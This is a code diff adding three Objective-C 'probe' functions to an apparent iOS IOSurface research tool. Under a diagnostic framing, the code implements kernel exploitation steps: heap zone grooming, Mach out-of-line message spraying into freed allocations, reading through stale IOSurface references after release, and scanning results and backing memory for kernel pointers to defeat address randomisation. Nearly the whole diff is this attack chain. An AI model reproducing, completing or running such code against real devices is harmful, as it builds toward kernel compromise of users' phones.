@@ -13330,3 +13330,692 @@ void iosurface_research_kernel_read(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
         }
     });
 }
+
+#pragma mark - Probe 61: Zone Spray
+
+void iosurface_research_zone_spray(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"ZONESPRAY: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"ZONESPRAY: Starting kalloc zone spray — property-based zone overlap detection");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            #define ZS_COUNT 50
+            IOSurfaceRef surfaces[ZS_COUNT];
+            memset(surfaces, 0, sizeof(surfaces));
+            int created = 0;
+            int contaminated = 0;
+            int oolSent = 0;
+
+            if (!setValue || !copyValue) {
+                log(@"ZONESPRAY: Missing SetValue/CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Step 1: Create 50 surfaces with properties of varying sizes
+            if (!isr_stopped()) {
+                log(@"ZONESPRAY: Step 1 — Create 50 surfaces with sized properties");
+                NSDictionary *params = isr_default_surface_params(32, 32);
+
+                uint8_t patterns[] = {0xBB, 0xCC, 0xDD, 0xEE};
+                size_t sizes[] = {64, 256, 1024, 4096};
+
+                for (int i = 0; i < ZS_COUNT && !isr_stopped(); i++) {
+                    surfaces[i] = sym.create((__bridge CFDictionaryRef)params);
+                    if (!surfaces[i]) continue;
+                    created++;
+
+                    for (int s = 0; s < 4; s++) {
+                        NSMutableData *blob = [NSMutableData dataWithLength:sizes[s]];
+                        memset(blob.mutableBytes, patterns[s], sizes[s]);
+                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
+                        setValue(surfaces[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+                    }
+                }
+                log([NSString stringWithFormat:@"ZONESPRAY: Created %d surfaces with 4 properties each", created]);
+
+            // Step 2: Free every other surface
+            if (!isr_stopped()) {
+                log(@"ZONESPRAY: Step 2 — Free odd-indexed surfaces");
+                int freed = 0;
+                for (int i = 1; i < ZS_COUNT; i += 2) {
+                    if (surfaces[i]) {
+                        CFRelease(surfaces[i]);
+                        surfaces[i] = NULL;
+                        freed++;
+                    }
+                }
+                log([NSString stringWithFormat:@"ZONESPRAY: Freed %d surfaces", freed]);
+
+            // Step 3: Spray mach messages with OOL data into freed holes
+            if (!isr_stopped()) {
+                log(@"ZONESPRAY: Step 3 — Spray mach OOL messages into freed zones");
+
+                mach_port_t oolPorts[100];
+                int oolCount = 0;
+
+                for (int i = 0; i < 100 && !isr_stopped(); i++) {
+                    mach_port_t port = MACH_PORT_NULL;
+                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                    if (kr != KERN_SUCCESS) continue;
+                    oolPorts[oolCount++] = port;
+
+                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint8_t oolData[256];
+                    memset(oolData, 0xAA, sizeof(oolData));
+
+                    typedef struct {
+                        mach_msg_header_t header;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } OOLMsg;
+
+                    OOLMsg msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                    msg.header.msgh_size = sizeof(msg);
+                    msg.header.msgh_remote_port = port;
+                    msg.header.msgh_local_port = MACH_PORT_NULL;
+                    msg.body.msgh_descriptor_count = 1;
+                    msg.ool.address = oolData;
+                    msg.ool.size = sizeof(oolData);
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                    if (kr == KERN_SUCCESS) oolSent++;
+                }
+                log([NSString stringWithFormat:@"ZONESPRAY: Sent %d OOL messages", oolSent]);
+
+            // Step 4: Check surviving surfaces for contamination
+            if (!isr_stopped()) {
+                log(@"ZONESPRAY: Step 4 — Check surviving surfaces for cross-contamination");
+
+                for (int i = 0; i < ZS_COUNT; i += 2) {
+                    if (!surfaces[i] || isr_stopped()) continue;
+
+                    for (int s = 0; s < 4; s++) {
+                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
+                        CFTypeRef val = copyValue(surfaces[i], (__bridge CFStringRef)key);
+                        if (val) {
+                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                                NSData *data = (__bridge NSData *)val;
+                                const uint8_t *bytes = data.bytes;
+                                uint8_t expected[] = {0xBB, 0xCC, 0xDD, 0xEE};
+                                BOOL corrupt = NO;
+                                for (NSUInteger b = 0; b < data.length && b < 16; b++) {
+                                    if (bytes[b] != expected[s]) {
+                                        corrupt = YES;
+                                        break;
+                                    }
+                                }
+                                if (corrupt) {
+                                    contaminated++;
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"ZONESPRAY: *** CONTAMINATION surf %d prop %d: expected 0x%02X got 0x%02X ***",
+                                         i, s, expected[s], bytes[0]]);
+                                }
+                            }
+                            CFRelease(val);
+                        } else {
+                            anomalies++;
+                            contaminated++;
+                            log([NSString stringWithFormat:@"ZONESPRAY: *** Property MISSING from surf %d prop %d ***", i, s]);
+                        }
+                    }
+                }
+                log([NSString stringWithFormat:@"ZONESPRAY: Contaminated properties: %d", contaminated]);
+
+            // Step 5: Create new surfaces in freed holes, check for residual data
+            if (!isr_stopped()) {
+                log(@"ZONESPRAY: Step 5 — Create new surfaces, check for residual properties");
+                int residual = 0;
+                NSDictionary *params2 = isr_default_surface_params(32, 32);
+
+                for (int i = 1; i < ZS_COUNT && i < 10; i += 2) {
+                    if (isr_stopped()) break;
+                    IOSurfaceRef newSurf = sym.create((__bridge CFDictionaryRef)params2);
+                    if (!newSurf) continue;
+
+                    for (int s = 0; s < 4; s++) {
+                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
+                        CFTypeRef val = copyValue(newSurf, (__bridge CFStringRef)key);
+                        if (val) {
+                            residual++;
+                            anomalies++;
+                            log([NSString stringWithFormat:@"ZONESPRAY: *** RESIDUAL property found on new surface (old key ZS_%d_%d) ***", i, s]);
+                            CFRelease(val);
+                        }
+                    }
+                    CFRelease(newSurf);
+                }
+                log([NSString stringWithFormat:@"ZONESPRAY: Residual properties on new surfaces: %d", residual]);
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+                for (int i = 0; i < ZS_COUNT; i++) {
+                    if (surfaces[i]) CFRelease(surfaces[i]);
+                }
+            #undef ZS_COUNT
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"ZONESPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 5) verdict = @"CRITICAL — zone overlap confirmed, cross-contamination detected";
+            else if (anomalies >= 3) verdict = @"HIGH — property corruption or residual data found";
+            else if (anomalies >= 1) verdict = @"MEDIUM — limited cross-contamination";
+            else verdict = @"LOW — no zone overlap detected";
+            log([NSString stringWithFormat:@"ZONESPRAY: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"contaminated": @(contaminated),
+                @"oolSent": @(oolSent)
+            };
+            isr_checkpoint(@"ISR-ZoneSpray-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 62: Zone Reclaim
+
+void iosurface_research_zone_reclaim(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"ZONERECLAIM: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"ZONERECLAIM: Starting zone reclaim — destroy surface, spray OOL, read stale ref");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            IOSurfaceRef victim = NULL;
+            IOSurfaceID victimID = 0;
+            IOSurfaceRef staleRef = NULL;
+            mach_port_t oolPorts[200];
+            int oolCount = 0;
+            int staleDataFound = 0;
+            int portLikeValues = 0;
+
+            if (!setValue || !copyValue) {
+                log(@"ZONERECLAIM: Missing SetValue/CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Step 1: Create victim surface with large property
+            if (!isr_stopped()) {
+                log(@"ZONERECLAIM: Step 1 — Create victim surface with 4KB property");
+                NSDictionary *params = isr_default_surface_params(64, 64);
+                victim = sym.create((__bridge CFDictionaryRef)params);
+
+                if (victim) {
+                    victimID = sym.getID(victim);
+                    NSMutableData *blob = [NSMutableData dataWithLength:4096];
+                    uint32_t *words = (uint32_t *)blob.mutableBytes;
+                    for (int i = 0; i < 1024; i++) words[i] = 0xDEADBEEF;
+                    setValue(victim, CFSTR("ZR_victim_data"), (__bridge CFTypeRef)blob);
+
+                    staleRef = sym.lookup(victimID);
+                    log([NSString stringWithFormat:@"ZONERECLAIM: Victim ID=%u, stale ref obtained", (unsigned)victimID]);
+                } else {
+                    log(@"ZONERECLAIM: Failed to create victim");
+                }
+
+            // Step 2: Destroy victim surface
+            if (!isr_stopped() && victim) {
+                log(@"ZONERECLAIM: Step 2 — Destroy victim surface");
+                CFRelease(victim);
+                victim = NULL;
+
+            // Step 3: Spray mach OOL messages into freed zone
+            if (!isr_stopped()) {
+                log(@"ZONERECLAIM: Step 3 — Spray 200 OOL messages into freed kalloc zone");
+
+                for (int i = 0; i < 200 && !isr_stopped(); i++) {
+                    mach_port_t port = MACH_PORT_NULL;
+                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                    if (kr != KERN_SUCCESS) continue;
+                    oolPorts[oolCount++] = port;
+
+                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint32_t oolData[128];
+                    for (int j = 0; j < 128; j++) oolData[j] = 0xCAFE0000 | j;
+
+                    typedef struct {
+                        mach_msg_header_t header;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } OOLMsg;
+
+                    OOLMsg msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                    msg.header.msgh_size = sizeof(msg);
+                    msg.header.msgh_remote_port = port;
+                    msg.header.msgh_local_port = MACH_PORT_NULL;
+                    msg.body.msgh_descriptor_count = 1;
+                    msg.ool.address = oolData;
+                    msg.ool.size = sizeof(oolData);
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                }
+                log([NSString stringWithFormat:@"ZONERECLAIM: Sprayed %d OOL messages", oolCount]);
+
+            // Step 4: Read via stale reference
+            if (!isr_stopped()) {
+                log(@"ZONERECLAIM: Step 4 — Attempt read via stale lookup reference");
+
+                IOSurfaceRef relookup = sym.lookup(victimID);
+                IOSurfaceRef readRef = relookup ? relookup : staleRef;
+                BOOL usedRelookup = relookup != NULL;
+
+                if (readRef) {
+                    CFTypeRef val = copyValue(readRef, CFSTR("ZR_victim_data"));
+                    if (val) {
+                        anomalies++;
+                        staleDataFound = 1;
+                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                            NSData *data = (__bridge NSData *)val;
+                            const uint32_t *words = (const uint32_t *)data.bytes;
+                            size_t wordCount = data.length / 4;
+                            int deadbeef = 0, cafe = 0, other = 0;
+
+                            for (size_t w = 0; w < wordCount && w < 256; w++) {
+                                uint32_t v = words[w];
+                                if (v == 0xDEADBEEF) deadbeef++;
+                                else if ((v & 0xFFFF0000) == 0xCAFE0000) { cafe++; anomalies++; }
+                                else if (v != 0) other++;
+                            }
+                            log([NSString stringWithFormat:@"ZONERECLAIM: *** STALE READ %@ — DEADBEEF=%d CAFE=%d other=%d (len=%zu) ***",
+                                 usedRelookup ? @"via relookup" : @"via stale ref",
+                                 deadbeef, cafe, other, data.length]);
+
+                            if (cafe > 0) {
+                                log(@"ZONERECLAIM: *** CRITICAL: OOL spray data visible via IOSurfaceCopyValue ***");
+                            }
+                        }
+                        CFRelease(val);
+                    } else {
+                        log([NSString stringWithFormat:@"ZONERECLAIM: CopyValue returned NULL %@",
+                             usedRelookup ? @"(relookup)" : @"(stale ref)"]);
+                    }
+
+                    size_t w = sym.getWidth(readRef);
+                    size_t h = sym.getHeight(readRef);
+                    size_t alloc = sym.getAllocSize(readRef);
+                    if (w != 64 || h != 64) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"ZONERECLAIM: *** Stale dimensions changed: w=%zu h=%zu alloc=%zu ***",
+                             w, h, alloc]);
+                    }
+                } else {
+                    log(@"ZONERECLAIM: Both stale ref and relookup returned NULL — surface properly invalidated");
+                }
+
+            // Step 5: Check mach port types on suspicious values
+            if (!isr_stopped()) {
+                log(@"ZONERECLAIM: Step 5 — Probe for port-like values via mach API");
+
+                for (uint32_t testPort = 0x100; testPort < 0x500; testPort += 4) {
+                    if (isr_stopped()) break;
+                    mach_port_type_t type = 0;
+                    kern_return_t kr = mach_port_type(mach_task_self(), testPort, &type);
+                    if (kr == KERN_SUCCESS && type != 0) {
+                        portLikeValues++;
+                        if (portLikeValues <= 5) {
+                            log([NSString stringWithFormat:@"ZONERECLAIM: Valid port at name 0x%X type=0x%X", testPort, type]);
+                        }
+                    }
+                }
+                log([NSString stringWithFormat:@"ZONERECLAIM: Found %d valid port names in scan range", portLikeValues]);
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            if (staleRef) CFRelease(staleRef);
+            if (victim) CFRelease(victim);
+            for (int i = 0; i < oolCount; i++) {
+                mach_port_deallocate(mach_task_self(), oolPorts[i]);
+                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"ZONERECLAIM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 5) verdict = @"CRITICAL — zone reclaim confirmed, OOL data readable via stale ref";
+            else if (anomalies >= 3) verdict = @"HIGH — stale reference readable, potential zone overlap";
+            else if (anomalies >= 1) verdict = @"MEDIUM — partial stale data accessible";
+            else verdict = @"LOW — surface properly invalidated";
+            log([NSString stringWithFormat:@"ZONERECLAIM: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"staleDataFound": @(staleDataFound),
+                @"portLikeValues": @(portLikeValues),
+                @"oolSprayed": @(oolCount)
+            };
+            isr_checkpoint(@"ISR-ZoneReclaim-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 63: Ptr Leak
+
+void iosurface_research_ptr_leak(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PTRLEAK: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PTRLEAK: Starting full ptr leak chain — zone spray + reclaim + kernel pointer scan");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            #define PL_COUNT 50
+            IOSurfaceRef surfaces[PL_COUNT];
+            IOSurfaceID surfIDs[PL_COUNT];
+            memset(surfaces, 0, sizeof(surfaces));
+            memset(surfIDs, 0, sizeof(surfIDs));
+            mach_port_t oolPorts[200];
+            int oolCount = 0;
+            int kernelPtrCount = 0;
+            int staleReads = 0;
+
+            if (!setValue || !copyValue) {
+                log(@"PTRLEAK: Missing SetValue/CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            // Step 1: Create 50 surfaces with large property blobs
+            if (!isr_stopped()) {
+                log(@"PTRLEAK: Step 1 — Create 50 surfaces with 2KB property blobs");
+                NSDictionary *params = isr_default_surface_params(64, 64);
+
+                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
+                    surfaces[i] = sym.create((__bridge CFDictionaryRef)params);
+                    if (!surfaces[i]) continue;
+                    surfIDs[i] = sym.getID(surfaces[i]);
+
+                    NSMutableData *blob = [NSMutableData dataWithLength:2048];
+                    uint32_t *words = (uint32_t *)blob.mutableBytes;
+                    for (int j = 0; j < 512; j++) words[j] = 0xAA000000 | (i << 12) | j;
+                    NSString *key = [NSString stringWithFormat:@"PL_blob_%d", i];
+                    setValue(surfaces[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
+                }
+                log([NSString stringWithFormat:@"PTRLEAK: Created %d surfaces with property blobs", PL_COUNT]);
+
+            // Step 2: Get stale lookup references then destroy all
+            if (!isr_stopped()) {
+                log(@"PTRLEAK: Step 2 — Obtain stale refs via lookup, then destroy surfaces");
+
+                IOSurfaceRef staleRefs[PL_COUNT];
+                memset(staleRefs, 0, sizeof(staleRefs));
+
+                for (int i = 0; i < PL_COUNT; i++) {
+                    if (surfIDs[i] != 0) {
+                        staleRefs[i] = sym.lookup(surfIDs[i]);
+                    }
+                }
+
+                for (int i = 0; i < PL_COUNT; i++) {
+                    if (surfaces[i]) {
+                        CFRelease(surfaces[i]);
+                        surfaces[i] = NULL;
+                    }
+                }
+                log(@"PTRLEAK: All surfaces destroyed, stale refs held");
+
+            // Step 3: Spray OOL mach messages into freed zones
+            if (!isr_stopped()) {
+                log(@"PTRLEAK: Step 3 — Spray 200 OOL messages into freed kalloc zones");
+
+                for (int i = 0; i < 200 && !isr_stopped(); i++) {
+                    mach_port_t port = MACH_PORT_NULL;
+                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                    if (kr != KERN_SUCCESS) continue;
+                    oolPorts[oolCount++] = port;
+
+                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint32_t oolData[512];
+                    for (int j = 0; j < 512; j++) oolData[j] = 0xFEED0000 | (i << 8) | (j & 0xFF);
+
+                    typedef struct {
+                        mach_msg_header_t header;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } OOLMsg;
+
+                    OOLMsg msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                    msg.header.msgh_size = sizeof(msg);
+                    msg.header.msgh_remote_port = port;
+                    msg.header.msgh_local_port = MACH_PORT_NULL;
+                    msg.body.msgh_descriptor_count = 1;
+                    msg.ool.address = oolData;
+                    msg.ool.size = sizeof(oolData);
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                }
+                log([NSString stringWithFormat:@"PTRLEAK: Sprayed %d OOL messages", oolCount]);
+
+            // Step 4: Read stale references and scan for kernel pointers
+            if (!isr_stopped()) {
+                log(@"PTRLEAK: Step 4 — Scan stale refs for kernel pointer patterns");
+
+                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
+                    if (!staleRefs[i]) continue;
+
+                    IOSurfaceRef relookup = sym.lookup(surfIDs[i]);
+                    IOSurfaceRef readRef = relookup ? relookup : staleRefs[i];
+
+                    if (readRef) {
+                        NSString *key = [NSString stringWithFormat:@"PL_blob_%d", i];
+                        CFTypeRef val = copyValue(readRef, (__bridge CFStringRef)key);
+                        if (val) {
+                            staleReads++;
+                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                                NSData *data = (__bridge NSData *)val;
+                                const uint64_t *qwords = (const uint64_t *)data.bytes;
+                                size_t qcount = data.length / 8;
+
+                                int origPattern = 0, feedPattern = 0, kptr = 0;
+                                for (size_t q = 0; q < qcount; q++) {
+                                    uint64_t v = qwords[q];
+                                    uint32_t lo = (uint32_t)(v & 0xFFFFFFFF);
+                                    uint32_t hi = (uint32_t)(v >> 32);
+
+                                    if ((lo & 0xFF000000) == 0xAA000000) origPattern++;
+                                    if ((lo & 0xFFFF0000) == 0xFEED0000 || (hi & 0xFFFF0000) == 0xFEED0000) feedPattern++;
+
+                                    if (v > 0xFFFFFF8000000000ULL && v < 0xFFFFFFFFFFFFFFFFULL) {
+                                        kptr++;
+                                        if (kptr <= 3) {
+                                            log([NSString stringWithFormat:@"PTRLEAK: *** KERNEL PTR at surf %d +0x%zx = 0x%016llX ***",
+                                                 i, q * 8, (unsigned long long)v]);
+                                        }
+                                    }
+                                }
+
+                                if (feedPattern > 0) {
+                                    anomalies += 2;
+                                    log([NSString stringWithFormat:@"PTRLEAK: *** OOL RECLAIM surf %d: feed=%d orig=%d ***",
+                                         i, feedPattern, origPattern]);
+                                }
+                                if (kptr > 0) {
+                                    anomalies += 3;
+                                    kernelPtrCount += kptr;
+                                    log([NSString stringWithFormat:@"PTRLEAK: *** %d KERNEL POINTERS in surf %d data ***", kptr, i]);
+                                }
+                            }
+                            CFRelease(val);
+                        }
+
+                        size_t w = sym.getWidth(readRef);
+                        size_t h = sym.getHeight(readRef);
+                        if (w != 64 || h != 64) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"PTRLEAK: *** Stale surf %d dims changed: w=%zu h=%zu ***", i, w, h]);
+                        }
+                    }
+
+                    if (relookup) CFRelease(relookup);
+                }
+                log([NSString stringWithFormat:@"PTRLEAK: Stale reads=%d, kernel ptrs=%d", staleReads, kernelPtrCount]);
+
+            // Step 5: Scan backing memory of stale refs
+            if (!isr_stopped()) {
+                log(@"PTRLEAK: Step 5 — Scan stale ref backing memory for kernel values");
+                int backingKptrs = 0;
+
+                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
+                    if (!staleRefs[i]) continue;
+
+                    kern_return_t kr = sym.lock(staleRefs[i], 0, NULL);
+                    if (kr != KERN_SUCCESS) continue;
+
+                    void *base = sym.getBase(staleRefs[i]);
+                    if (base) {
+                        size_t allocSize = sym.getAllocSize(staleRefs[i]);
+                        size_t scanSize = allocSize < 16384 ? allocSize : 16384;
+                        uint64_t localBuf[2048];
+                        vm_size_t outSize = 0;
+
+                        kr = vm_read_overwrite(mach_task_self(), (vm_address_t)base, scanSize,
+                                               (vm_address_t)localBuf, &outSize);
+                        if (kr == KERN_SUCCESS && outSize > 0) {
+                            size_t qcount = outSize / 8;
+                            for (size_t q = 0; q < qcount; q++) {
+                                uint64_t v = localBuf[q];
+                                if (v > 0xFFFFFF8000000000ULL && v < 0xFFFFFFFFFFFFFFFFULL) {
+                                    backingKptrs++;
+                                    if (backingKptrs <= 3) {
+                                        log([NSString stringWithFormat:@"PTRLEAK: *** BACKING KPTR surf %d +0x%zx = 0x%016llX ***",
+                                             i, q * 8, (unsigned long long)v]);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    sym.unlock(staleRefs[i], 0, NULL);
+                }
+
+                if (backingKptrs > 0) {
+                    anomalies += backingKptrs;
+                    kernelPtrCount += backingKptrs;
+                    log([NSString stringWithFormat:@"PTRLEAK: *** %d kernel pointers found in backing memory ***", backingKptrs]);
+                } else {
+                    log(@"PTRLEAK: No kernel pointers in backing memory");
+                }
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+
+                for (int i = 0; i < PL_COUNT; i++) {
+                    if (staleRefs[i]) CFRelease(staleRefs[i]);
+                }
+
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < oolCount; i++) {
+                mach_port_deallocate(mach_task_self(), oolPorts[i]);
+                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+            #undef PL_COUNT
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PTRLEAK: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 10) verdict = @"CRITICAL — kernel pointers leaked via zone reclaim + stale reference";
+            else if (anomalies >= 5) verdict = @"HIGH — OOL reclaim confirmed, potential kernel pointer exposure";
+            else if (anomalies >= 2) verdict = @"MEDIUM — stale data accessible, zone overlap partial";
+            else if (anomalies >= 1) verdict = @"LOW — minimal stale data";
+            else verdict = @"LOW — all references properly invalidated";
+            log([NSString stringWithFormat:@"PTRLEAK: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"staleReads": @(staleReads),
+                @"kernelPtrCount": @(kernelPtrCount),
+                @"oolSprayed": @(oolCount)
+            };
+            isr_checkpoint(@"ISR-PtrLeak-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
